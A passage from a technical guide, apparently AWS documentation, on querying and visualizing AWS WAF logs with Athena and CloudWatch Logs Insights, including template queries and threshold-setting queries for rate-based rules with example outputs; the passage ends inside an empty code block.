# Querying and Visualizing WAF Logs

This section of the guide focuses on explaining the *why* behind each approach so you can make informed decisions — but ultimately provides practical recommendations throughout if you just need a clear path to follow without the background context. In many cases, you already have an established approach for observability, and this guide will simply help you operate that system and understand how to consume WAF log data.

**Effective WAF monitoring requires two things:**  

The ability to query your logs and the ability to visualize trends through dashboards. The native AWS WAF dashboard provides a quick operational view and works well for smaller teams or single-application deployments where CloudWatch Logs is the log destination. For customers that do not use CloudWatch Logs, or work with more than a handful of applications, you can either send WAF logs to an existing observability platform or use AWS native services to query and visualize WAF log data. In general, match your WAF monitoring to whatever your team already does for observability.  

The second half of this guide focuses on getting value out of those logs through queries. We start with comprehensive "super queries" that fully parse WAF log fields — including nested rule group evaluations, labels, request headers, and terminating rule details — into a structured, usable format.  These queries are designed as robust starting points you can trim down. From there, we cover focused queries for common operational use cases: evaluating AWS Managed Rules impact before switching from Count to Block, determining appropriate thresholds for rate-based rules, and identifying patterns to scope well-designed false positive exceptions.


---

## Comprehensive Starting Queries

The queries in this section are intentionally large and comprehensive. The objective is to provide a template you can build most queries from by uncommenting and deleting what you don't need. The parsing and SQL logic to extract values from WAF logs and multiple common examples of how to do things like count by is already done so you can focus on what you need, not how to write the query itself.

Many of the columns in these queries parse AWS Managed Rule (AMR) labels. Labels are only present in a log record if the corresponding managed rule group is attached to your protection pack *and* the rule evaluated the request. For example, if you do not have Bot Control (Common) in your protection pack, the `verified`/`unverified` labels will never appear and those columns will return null. Similarly, a rule that does not match a given request will not emit a label for that request — a null value means the label was not applied, not that something is broken.
### Athena
!!! warning "Ensure the Athena database and table match what you created."
```sql
SELECT
    from_unixtime(timestamp / 1000) AS log_time,
    -- bin by 1 minute intervals
    -- date_trunc('minute', from_unixtime(timestamp / 1000)) AS time_bucket,
    -- bin by 5 minute intervals
    -- rom_unixtime((timestamp / 1000) - ((timestamp / 1000) % 300)) AS time_bucket,
    -- bin by 1 day intervals
    -- date_trunc('day', from_unixtime(timestamp / 1000)) AS time_bucket,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    action,
    terminatingruleid,
    -- terminatingruletype,
    -- terminatingrulematchdetails,
    -- nonterminatingmatchingrules,
    -- ja3fingerprint,
    -- ja4fingerprint,
    httprequest.httpmethod AS httpMethod,
    -- Extract host header
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value AS host,
    httprequest.uri AS uri,
    httprequest.args AS args,
    -- httprequest.httpversion AS httpVersion,
    httprequest.requestid AS requestId,

    -- User-Agent header
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'user-agent'), 1).value AS userAgent,

    -- Token status label
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:token:%' AND l.name NOT LIKE 'awswaf:managed:token:fingerprint:%'), 1).name, ':'), -1) AS tokenStatus,

    -- Amazon IP list label
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:amazon-ip-list:%'), 1).name, ':'), -1) AS amazonIpList,

    -- Anonymous IP list label
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:anonymous-ip-list:%'), 1).name, ':'), -1) AS anonymousIpList

    -- Geo region label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:clientip:geo:region:%'), 1).name, ':'), -1) AS isoRegion

    -- CAPTCHA token status
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:captcha:%'), 1).name, ':'), -1) AS captchaTokenStatus

    -- Anti-DDoS labels
    -- ,CASE WHEN cardinality(filter(labels, l -> l.name = 'awswaf:managed:aws:anti-ddos:event-detected')) > 0 THEN true ELSE false END AS antiDdosActiveEvent
    -- ,CASE WHEN cardinality(filter(labels, l -> l.name = 'awswaf:managed:aws:anti-ddos:challengeable-request')) > 0 THEN true ELSE false END AS antiDdosIsChallengeable
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:anti-ddos:%-suspicion-ddos-request'), 1).name, ':'), -1) AS ddosSuspicion

    -- Core Rule Set label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:core-rule-set:%'), 1).name, ':'), -1) AS coreRuleSet

    -- Admin Protection label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:admin-protection:%'), 1).name, ':'), -1) AS adminProtection

    -- Known Bad Inputs label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:known-bad-inputs:%'), 1).name, ':'), -1) AS knownBadInputs

    -- SQL Database label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:sql-database:%'), 1).name, ':'), -1) AS sqlDatabase

    -- Linux OS label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:linux-os:%'), 1).name, ':'), -1) AS linuxOs

    -- POSIX OS label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:posixos:%'), 1).name, ':'), -1) AS posixOs

    -- Windows OS label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:windows-os:%'), 1).name, ':'), -1) AS windowsOs

    -- PHP App label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:php-app:%'), 1).name, ':'), -1) AS phpApp

    -- WordPress App label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:wordpress-app:%'), 1).name, ':'), -1) AS wordpressApp

    -- Token Fingerprint label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:token:fingerprint:%'), 1).name, ':'), -1) AS tokenFingerprint

    -- ACFP label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:acfp%'), 1).name, ':'), -1) AS acfp

    -- ATP label
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:atp:%'), 1).name, ':'), -1) AS atp

    -- Bot Control labels
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:name:%'), 1).name, ':'), -1) AS botName
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:category:%'), 1).name, ':'), -1) AS botCategory
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:signal:%'), 1).name, ':'), -1) AS botSignal
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:account:%'), 1).name, ':'), -1) AS botAccount
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:web_bot_auth:%'), 1).name, ':'), -1) AS webBotAuthStatus
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:organization:%'), 1).name, ':'), -1) AS botOrganization
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:vendor:%'), 1).name, ':'), -1) AS botVendor
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:targeted:aggregate:%'), 1).name, ':'), -1) AS botTargetedAggregate
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:bot:targeted:signal:%'), 1).name, ':'), -1) AS botTargetedSignal
    -- ,element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:TGT_:%'), 1).name, ':'), -1) AS botTGT

    -- Bot verified status (boolean-style)
    -- ,CASE
    --     WHEN cardinality(filter(labels, l -> l.name = 'awswaf:managed:aws:bot-control:bot:verified')) > 0 THEN 'verified'
    --     WHEN cardinality(filter(labels, l -> l.name = 'awswaf:managed:aws:bot-control:bot:unverified')) > 0 THEN 'unverified'
    --     ELSE 'notBot'
    -- END AS botVerified

FROM waf_logs
WHERE
    -- NOTE: Athena WHERE clause cannot use SELECT aliases (e.g. "clientIp").
    -- You must use the full column path (e.g. httprequest.clientip) in all WHERE conditions.
    -- For headers and labels, use the same filter() syntax shown in SELECT.

    -- Time range filter (timestamp column is epoch milliseconds; use to_unixtime to convert a readable date)
    -- Option 1: Specific date range
    -- timestamp >= to_unixtime(TIMESTAMP '2026-06-25 00:00:00') * 1000
    -- AND timestamp < to_unixtime(TIMESTAMP '2026-06-26 00:00:00') * 1000
    -- Option 2: Relative time (last 7 days from now)
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    -- AND action = 'ALLOW'
    -- AND action = 'BLOCK'
    -- AND httprequest.clientip = '192.0.2.1'
    -- AND httprequest.clientip IN ('192.0.2.1', '198.51.100.10', '203.0.113.50')
    -- AND httprequest.country = 'US'
    -- AND httprequest.country NOT IN ('CN', 'RU', 'KP', 'IR')
    -- AND httprequest.uri LIKE '/api/%'
    -- AND element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value = 'api.example.com'
    -- AND terminatingruleid = 'AWS-AWSManagedRulesCommonRuleSet'
    -- AND cardinality(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:bot-control:%')) > 0
    -- AND cardinality(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:core-rule-set:%')) > 0
ORDER BY timestamp DESC
-- GROUP BY is useful to identify patterns and frequency. Use with aggregate functions like count(*), date_trunc

-- GROUP by source IP and time, add other columns here and in select to get more granuarlity, e.g. action, uri, user-agent
-- GROUP BY httprequest.clientip, date_trunc('minute', from_unixtime(timestamp / 1000))

-- GROUP by HTTP Method, then HOST, then URI
-- GROUP BY httprequest.httpMethod, element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value, httprequest.uri

LIMIT 1000
```

### Amazon CloudWatch Log Analytics
!!! warning "You need to set the source (line 1) ARN to your actual cloudwatch log group ARN."  
```sql
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-3600s END=0s |
    fields @timestamp,
    # bin by 1 minute intervals
    #bin(1m) as binTime,
    # bin by 5 minute intervals
    #bin(5m) as binTime,
    # bin by 1 day intervals
    #bin(1d) as binTime,

    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    action,
    terminatingRuleId,
    #terminatingRuleType,
    #terminatingRuleMatchDetails,
    #nonTerminatingMatchingRules,
    #ja3Fingerprint,
    #ja4Fingerprint,
    httpRequest.httpMethod as httpMethod,
    httpRequest.host as host,
    httpRequest.uri as uri,
    httpRequest.args as args,
    #httpRequest.scheme as scheme,
    httpRequest.requestId as requestId
    # Additional common fields
    #if(strcontains(@message, "awswaf:managed:aws:anti-ddos:challengeable-request") = 1, "true", "false") as antiDdosIschallengable,

    | parse @message /\"name\":\s*\"User-Agent\",\s*\"value\":\s*\"(?<userAgent>[^"]*)\"/
    | parse @message /\"name\":\s*\"awswaf:managed:token:(?<tokenStatus>[^"]*)\"/
    | parse @message /\"name\":\s*\"awswaf:managed:aws:amazon-ip-list:(?<amazonIpList>[^"]*)\"/
    | parse @message /\"name\":\s*\"awswaf:managed:aws:anonymous-ip-list:(?<anonymousIpList>[^"]*)\"/

    # Additional fields via message Parse
    #| parse @message /\"name\":\s*\"awswaf:clientip:geo:region:(?<isoRegion>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:captcha:(?<captchaTokenStatus>[^"]*)\"/


    # Amazaon Managed Rule Label fields.  Mix of boolean and label values
    #if(strcontains(@message, "awswaf:managed:aws:anti-ddos:event-detected") = 1, "true", "false") as antiDdosActiveEvent,
    #if(strcontains(@message, "awswaf:managed:aws:bot-control:bot:verified") = 1, "verified", if(strcontains(@message, "awswaf:managed:aws:bot-control:bot:unverified") = 1, "unverified", "notBot")) as botVerified
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:core-rule-set:(?<coreRuleSet>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:anti-ddos:(?<ddosSuspicion>[^"]*)-suspicion-ddos-request\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:anti-ddos:ddos-request(?<ddosRequest>[^"]*)\"/

    #| parse @message /\"name\":\s*\"awswaf:managed:aws:admin-protection:(?<adminProtection>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:known-bad-inputs:(?<knownBadInputs>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:sql-database:(?<sqlDatabase>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:linux-os:(?<linuxOs>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:posixos:(?<posixOs>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:windows-os:(?<windowsOs>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:php-app:(?<phpApp>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:wordpress-app:(?<wordpressApp>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:token:fingerprint:(?<tokenFingerprint>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:acfp(?<acfp>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:atp:(?<atp>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:name:(?<botName>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:category:(?<botCategory>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:signal:(?<botSignal>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:account:(?<botAccount>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:web_bot_auth:(?<webBotAuthStatus>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:organization:(?<botOrganization>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:vendor:(?<botVendor>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:targeted:aggregate:(?<botTargetedAggregate>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:bot:targeted:signal:(?<botTargetedSignal>[^"]*)\"/
    #| parse @message /\"name\":\s*\"awswaf:managed:aws:bot-control:TGT_:(?<botTGT>[^"]*)\"/

    #| display clientIp, country, isoRegion, httpMethod, scheme, host, uri, args,  action, userAgent, tokenStatus, amazonIpList, coreRuleSet, ddosSuspicion, antiDdosIschallengable,antiDdosActiveEvent, botVerified

    # Common filter examples (uncomment and adjust values as needed)
    # Filter by specific source IPs
    #| filter clientIp in ["192.0.2.1", "198.51.100.10", "203.0.113.50"]

    # Filter by host header
    #| filter host = "api.example.com"
    #| filter host like /.*\.example\.com/

    # Exclude specific countries (e.g. keep only traffic NOT from these countries)
    #| filter country not in ["CN", "RU", "KP", "IR"]

    # Filter by label presence (using strcontains on the raw message)
    #| filter strcontains(@message, "awswaf:managed:aws:core-rule-set:")
    #| filter strcontains(@message, "awswaf:managed:aws:bot-control:bot:name:")

    # Filter by action
    #| filter action = "BLOCK"
    #| filter action = "ALLOW"

    # Group by is useful to identify patterns and frequency. You use group by with some stat, e.g. bin(5m), count(*)
    # group by clientIp, binTime
    | sort @timestamp desc

```

---

## Evaluating AWS WAF Rules Through Log Queries

This section provides ready-to-use queries to help you evaluate rate-based rules and AWS Managed Rules in Count mode before switching them to Block/enforcement. Each query targets a real decision you need to make — what threshold to set, whether a rule is safe to enforce, or what you need to scope as exceptions. For the most part, you can simply copy the query, adjust the time range and table name/log group arn, and run it.

For general-purpose Athena query examples against WAF logs, see [Querying AWS WAF logs](https://docs.aws.amazon.com/athena/latest/ug/query-examples-waf-logs.html) in the Athena documentation.

### Rate-based rules: Identifying the right threshold

Rate-based rules block or count requests based on some single or composite key that exceed a threshold within the configured evaluation window. To choose the right threshold, you need to understand what your application(s) usually experience. 

The queries below show your existing traffic rates to determine appropriate thresholds based on historical traffic. Start with the general source IP query to understand your overall request distribution, there are a number of other useful and common rate based rules to consider with example queries specific to these common examples.

In the examples below, we bin/date_trunc into 5-minute windows, ensure the query's bin/date_trunc matches the evaluation window you intend to use in your actual rate based rules.

Once you have query results showing your traffic patterns, see [Choosing a threshold](../../custom-rules/docs/index.md#choosing-a-threshold) for guidance on how to translate those numbers into an appropriate rate-based rule configuration.


#### General: requests per source IP

This query shows the top source IPs by request count in 5-minute windows. Use this to understand your baseline traffic distribution and identify what a reasonable overall rate limit would be.

**Athena**
```sql
SELECT
    date_trunc('minute', from_unixtime(timestamp / 1000)) AS time_bucket,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    count(*) AS request_count
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
GROUP BY
    date_trunc('minute', from_unixtime(timestamp / 1000)),
    httprequest.clientip,
    httprequest.country
ORDER BY request_count DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-3600s END=0s |
    fields @timestamp,
    bin(5m) as binTime,
    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    action
    | stats count(*) as request_count by clientIp, country, binTime
    | sort request_count desc
    | limit 100
```

**Example output**

| time_bucket | clientIp | country | request_count |
|-------------|----------|---------|---------------|
| 2026-07-26 14:35:00.000 | 192.0.2.17 | CN | 8,742 |
| 2026-07-28 03:10:00.000 | 203.0.113.44 | RU | 7,219 |
| 2026-07-25 22:50:00.000 | 192.51.100.88 | VN | 6,531 |
| 2026-07-27 09:05:00.000 | 192.0.2.203 | BR | 5,104 |
| 2026-07-29 16:20:00.000 | 203.0.113.12 | US | 548 |
| 2026-07-26 08:45:00.000 | 192.51.100.34 | US | 543 |
| 2026-07-30 11:30:00.000 | 192.0.2.91 | US | 539 |
| 2026-07-25 19:15:00.000 | 203.0.113.77 | CA | 536 |
| 2026-07-28 07:40:00.000 | 192.51.100.142 | US | 531 |
| 2026-07-27 13:55:00.000 | 192.0.2.56 | US | 528 |
| 2026-07-29 22:10:00.000 | 203.0.113.201 | MX | 525 |
| 2026-07-26 04:25:00.000 | 192.51.100.7 | DE | 522 |
| 2026-07-30 09:50:00.000 | 192.0.2.164 | CA | 519 |
| 2026-07-25 15:05:00.000 | 203.0.113.158 | US | 517 |
| 2026-07-28 20:30:00.000 | 192.51.100.219 | US | 514 |
| 2026-07-27 06:15:00.000 | 192.0.2.38 | GB | 511 |
| 2026-07-29 12:40:00.000 | 203.0.113.93 | US | 509 |
| 2026-07-26 18:00:00.000 | 192.51.100.61 | US | 506 |
| 2026-07-30 01:25:00.000 | 192.0.2.127 | DE | 503 |
| 2026-07-25 10:50:00.000 | 203.0.113.180 | US | 501 |


**How to read these results**

The results above are an example subset of what you might actually see. Looking at these results, the first 4 rows have values well above everything else, while the remaining rows show that 500–550 appears to be the typical peak. In a real scenario, you would want to review more rows to validate that 500–550 really is the peak request rate per 5-minute bin. You might also want to spot-check the 4 IPs with well-above-typical values to ensure they are not a unique system (an internal use case, a specific large client, etc). Assuming that review does not reveal anything unexpected, it would be a reasonable starting point to assume the most active legitimate source sends 500–550 requests per 5-minute window. Once you have that baseline, use the [Choosing a threshold](../../custom-rules/docs/index.md#choosing-a-threshold) guidance to translate that value into an appropriate rate-based rule configuration.



**Scoping to a specific path** — To protect sensitive or expensive endpoints (e.g., file uploads, form submissions, API mutations) where you want a much tighter rate limit than a global threshold, add a URI path and HTTP method filter. This narrows the query to only count requests hitting that endpoint, so you can set appropriate per-endpoint thresholds. Adjust the URI path and method to match your use case.

**Athena**
```sql
SELECT
    date_trunc('minute', from_unixtime(timestamp / 1000)) AS time_bucket,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    httprequest.uri AS uri,
    httprequest.httpmethod AS httpMethod,
    count(*) AS request_count
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    AND action = 'ALLOW'
    AND httprequest.uri LIKE '/upload%'
    AND httprequest.httpmethod = 'POST'
GROUP BY
    date_trunc('minute', from_unixtime(timestamp / 1000)),
    httprequest.clientip,
    httprequest.country,
    httprequest.uri,
    httprequest.httpmethod
ORDER BY request_count DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-604800s END=0s |
    fields @timestamp,
    bin(5m) as binTime,
    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    httpRequest.uri as uri,
    httpRequest.httpMethod as httpMethod,
    action
    | filter action = "ALLOW"
    | filter uri like /^\/upload/
    | filter httpMethod = "POST"
    | stats count(*) as request_count by clientIp, country, binTime
    | sort request_count desc
    | limit 100
```

**Example output**

| time_bucket | clientIp | country | uri | httpMethod | request_count |
|-------------|----------|---------|-----|------------|---------------|
| 2026-07-26 09:15:00.000 | 192.0.2.41 | US | /upload | POST | 35 |
| 2026-07-28 14:30:00.000 | 203.0.113.92 | US | /upload | POST | 34 |
| 2026-07-27 03:45:00.000 | 192.51.100.18 | US | /upload | POST | 33 |
| 2026-07-29 17:20:00.000 | 192.0.2.156 | CA | /upload | POST | 33 |
| 2026-07-25 22:05:00.000 | 203.0.113.27 | US | /upload | POST | 32 |
| 2026-07-30 06:40:00.000 | 192.51.100.203 | US | /upload | POST | 31 |
| 2026-07-26 19:55:00.000 | 192.0.2.88 | US | /upload | POST | 31 |
| 2026-07-28 08:10:00.000 | 203.0.113.145 | MX | /upload | POST | 30 |
| 2026-07-27 12:25:00.000 | 192.51.100.67 | US | /upload | POST | 30 |
| 2026-07-29 21:50:00.000 | 192.0.2.214 | US | /upload | POST | 29 |
| 2026-07-25 16:35:00.000 | 203.0.113.58 | US | /upload | POST | 29 |
| 2026-07-30 02:00:00.000 | 192.51.100.129 | CA | /upload | POST | 28 |
| 2026-07-26 13:15:00.000 | 192.0.2.73 | US | /upload | POST | 28 |
| 2026-07-28 20:40:00.000 | 203.0.113.186 | US | /upload | POST | 27 |
| 2026-07-27 07:55:00.000 | 192.51.100.44 | GB | /upload | POST | 27 |
| 2026-07-29 11:10:00.000 | 192.0.2.195 | US | /upload | POST | 26 |
| 2026-07-25 18:25:00.000 | 203.0.113.71 | US | /upload | POST | 26 |
| 2026-07-30 04:50:00.000 | 192.51.100.156 | DE | /upload | POST | 26 |
| 2026-07-26 23:05:00.000 | 192.0.2.32 | US | /upload | POST | 25 |
| 2026-07-28 15:30:00.000 | 203.0.113.119 | US | /upload | POST | 25 |





**How to read these results**

The results above show the same type of analysis as the general source IP query, but scoped to a specific endpoint (`/upload` via `POST`). The request counts here are much lower — 25–35 per 5-minute window — which is expected for a single endpoint compared to all traffic from an IP. This tells you the legitimate usage pattern for this endpoint is significantly tighter than your global rate, and you can set a much more restrictive per-endpoint threshold. In a real scenario, you would review more rows to confirm 25–35 is truly the peak for this path, and spot-check any outliers. Once you have that baseline, use the [Choosing a threshold](../../custom-rules/docs/index.md#choosing-a-threshold) guidance to translate that value into an appropriate rate-based rule configuration scoped to this endpoint.

#### Composite key: source IP + cookie

Rate-based rules support composite keys that aggregate requests by multiple dimensions. Combining source IP with a cookie value (i.e. session) allows you to distinguish between multiple users behind the same IP (e.g. corporate NAT) . This is useful when you want to rate limit individual sessions rather than entire IP addresses.

The examples below extract the `Cookie` header value. You can use the AWS WAF token cookie (`aws-waf-token`) if you have [integrated the client-side SDK](../../captcha-and-challenge/docs/index.md#reactive-vs-passive-vs-deliberate) or any custom session cookie your application sets — replace the cookie name in the regex to match your use case. Using the raw cookie header rather than the WAF token fingerprint label makes this approach portable to any cookie-based session identifier.

**Athena**
```sql
SELECT
    date_trunc('minute', from_unixtime(timestamp / 1000)) AS time_bucket,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    -- Extract the aws-waf-token cookie value; replace cookie name for custom cookies
    regexp_extract(element_at(filter(httprequest.headers, h -> lower(h.name) = 'cookie'), 1).value, 'aws-waf-token=([^;]+)', 1) AS sessionCookie,
    count(*) AS request_count
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    AND action = 'ALLOW'
GROUP BY
    date_trunc('minute', from_unixtime(timestamp / 1000)),
    httprequest.clientip,
    httprequest.country,
    regexp_extract(element_at(filter(httprequest.headers, h -> lower(h.name) = 'cookie'), 1).value, 'aws-waf-token=([^;]+)', 1)
ORDER BY request_count DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-604800s END=0s |
    fields @timestamp,
    bin(5m) as binTime,
    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    action
    | parse @message /\"name\":\s*\"Cookie\",\s*\"value\":\s*\"[^"]*aws-waf-token=(?<sessionCookie>[^;"]*)/
    | filter action = "ALLOW"
    | stats count(*) as request_count by clientIp, sessionCookie, binTime
    | sort request_count desc
    | limit 100
```

**Example output**

| time_bucket | clientIp | country | sessionCookie | request_count |
|-------------|----------|---------|---------------|---------------|
| 2026-07-26 14:35:00.000 | 192.0.2.17 | US | aws-waf-token=a1b2c3d4-e5f6-7890-abcd-ef1234567890 | 312 |
| 2026-07-26 14:35:00.000 | 192.0.2.17 | US | aws-waf-token=b2c3d4e5-f6a7-8901-bcde-f12345678901 | 287 |
| 2026-07-26 14:35:00.000 | 192.0.2.17 | US | aws-waf-token=c3d4e5f6-a7b8-9012-cdef-012345678912 | 241 |
| 2026-07-28 03:10:00.000 | 203.0.113.44 | US | aws-waf-token=d4e5f6a7-b8c9-0123-defa-123456789023 | 298 |
| 2026-07-28 03:10:00.000 | 203.0.113.44 | US | aws-waf-token=e5f6a7b8-c9d0-1234-efab-234567890134 | 265 |
| 2026-07-27 09:05:00.000 | 192.51.100.88 | CA | aws-waf-token=f6a7b8c9-d0e1-2345-fabc-345678901245 | 276 |
| 2026-07-27 09:05:00.000 | 192.51.100.88 | CA | aws-waf-token=a7b8c9d0-e1f2-3456-abcd-456789012356 | 253 |
| 2026-07-27 09:05:00.000 | 192.51.100.88 | CA | aws-waf-token=b8c9d0e1-f2a3-4567-bcde-567890123467 | 219 |
| 2026-07-29 16:20:00.000 | 192.0.2.91 | US | aws-waf-token=c9d0e1f2-a3b4-5678-cdef-678901234578 | 245 |
| 2026-07-29 16:20:00.000 | 192.0.2.91 | US | aws-waf-token=d0e1f2a3-b4c5-6789-defa-789012345689 | 231 |
| 2026-07-25 22:50:00.000 | 203.0.113.12 | US | aws-waf-token=e1f2a3b4-c5d6-7890-efab-890123456790 | 238 |
| 2026-07-25 22:50:00.000 | 203.0.113.12 | US | aws-waf-token=f2a3b4c5-d6e7-8901-fabc-901234567801 | 214 |
| 2026-07-30 11:30:00.000 | 192.51.100.34 | DE | aws-waf-token=a3b4c5d6-e7f8-9012-abcd-012345678912 | 227 |
| 2026-07-30 11:30:00.000 | 192.51.100.34 | DE | aws-waf-token=b4c5d6e7-f8a9-0123-bcde-123456789023 | 198 |
| 2026-07-26 08:45:00.000 | 192.0.2.56 | US | aws-waf-token=c5d6e7f8-a9b0-1234-cdef-234567890134 | 211 |
| 2026-07-28 07:40:00.000 | 203.0.113.77 | GB | aws-waf-token=d6e7f8a9-b0c1-2345-defa-345678901245 | 204 |
| 2026-07-28 07:40:00.000 | 203.0.113.77 | GB | aws-waf-token=e7f8a9b0-c1d2-3456-efab-456789012356 | 187 |
| 2026-07-27 13:55:00.000 | 192.51.100.142 | US | aws-waf-token=f8a9b0c1-d2e3-4567-fabc-567890123467 | 195 |
| 2026-07-29 22:10:00.000 | 192.0.2.164 | US | aws-waf-token=a9b0c1d2-e3f4-5678-abcd-678901234578 | 189 |
| 2026-07-25 19:15:00.000 | 203.0.113.158 | US | aws-waf-token=b0c1d2e3-f4a5-6789-bcde-789012345689 | 182 |

**How to read these results**

The results above show per-session request counts rather than per-IP totals. Notice that `192.0.2.17` appears three times with different session cookies — each session sent 241–312 requests in the same 5-minute window. Without the composite key, that IP would aggregate to 840 requests instead of ~312 and require a threshold above 840 to avoid blocking legitimate users. In a real scenario, there might be dozens or even hundreds of clients behind the same IP using different sessions, which would push the IP-only aggregate far higher and force an impractically loose threshold. With the composite key, you can see that no single session exceeds ~312, allowing you to set a much tighter per-session threshold regardless of how many users share an IP. This is the key advantage of composite keys for IPs behind shared infrastructure (corporate NATs, VPNs, mobile carriers). Review more rows to confirm the per-session peak, then use the [Choosing a threshold](../../custom-rules/docs/index.md#choosing-a-threshold) guidance to set your rate-based rule configuration.

#### Composite key: source IP + protection pack ARN

For central security or operations teams that aggregate WAF logs across an AWS Organization, this query shows request rates per source IP broken out by protection pack. Rate-based rules are evaluated per protection pack — a single end user hitting multiple applications owned by different teams counts separately against each protection pack's rate limit. Understanding request rates per protection pack helps you set appropriate thresholds when deploying rate-based rules centrally (e.g. via Firewall Manager). It also makes it possible to identify outliers where a few applications may need a significantly higher threshold while most can use a lower, more restrictive value.

**Athena**
```sql
SELECT
    date_trunc('minute', from_unixtime(timestamp / 1000)) AS time_bucket,
    count(*) AS request_count,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    webaclid
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    AND action = 'ALLOW'
GROUP BY
    date_trunc('minute', from_unixtime(timestamp / 1000)),
    httprequest.clientip,
    httprequest.country,
    webaclid
ORDER BY request_count DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
